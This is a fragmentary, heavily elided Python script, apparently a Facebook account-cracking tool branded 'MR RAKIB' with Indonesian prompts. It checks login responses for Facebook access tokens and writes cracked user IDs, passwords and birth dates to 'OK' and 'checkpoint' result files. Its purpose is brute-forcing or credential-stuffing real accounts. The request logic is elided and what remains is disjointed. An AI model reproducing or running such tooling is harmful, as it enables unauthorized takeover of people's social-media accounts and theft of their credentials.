...
\033[94;1m╠[ \033[91;1mYOUTUBE  \033[97;1m: \033[93;1mMR RAKIB
\033[94;1m║\033[97;1m─────────────────────────────────────────────────────────────
...
def result():
	...
	if pilih=="1" or pilih=="01":
		...
		if len(lisaa)==0:
			print("\n"+balmond+k+" RAKIB CP")
			print(balmond+m+" Tidak Ada Rakib Cp")
		...
		if len(lisaa)==0:
			...
			marjan = input(balmond+l+" File : "+h+"")
			try:
				binatang = open("RAKIB_Ok/%s"%(marjan))
			except IOError:
				jalan(balmond+l+" Nama File Tidak Ada")
				time.sleep(0.5)
				menu()
		...
		try:
			...
			if 'access_token' in response.text and 'EAAA' in response.text:
				if "old" in old_gak:
					...
					bts = open("RAKIB_Ok/OK_%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
					ok.append(uid+"|"+pw)
				else:
					...
					try:
						...
						if len(lahir)==2:
							...
							if "old" in old_gak:
								...
								bts = open("RAKIB_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+"\n");bts.close()
								cp.append(uid+"|"+pw)
							else:
							...
							if "old" in old_gak:
								...
								bts = open("RAKIB_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+" "+lahir[2]+"\n");bts.close()
								cp.append(uid+"|"+pw)
							else:
						...
						if "old" in old_gak:
							...
							bts = open("RAKIB_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
							cp.append(uid+"|"+pw)
						else:
